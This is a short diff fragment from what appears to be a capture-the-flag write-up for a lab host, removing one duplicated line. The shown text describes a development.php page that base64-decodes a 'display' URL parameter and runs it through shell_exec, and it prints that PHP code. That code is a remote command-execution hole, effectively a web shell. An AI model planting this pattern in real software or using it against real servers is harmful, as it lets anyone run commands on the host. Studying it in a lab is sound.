@@ -242,7 +242,6 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
 *development.php shows that it decodes the "display" parameter as base64 hash and run as bash
 
         nobody@b6651f1755a8:/var/www/subdomains/underdevelopment$ cat development.php
-        cat development.php
         <?php 
         $output = shell_exec(base64_decode($_GET["display"]));
         echo "<pre>$output</pre>";
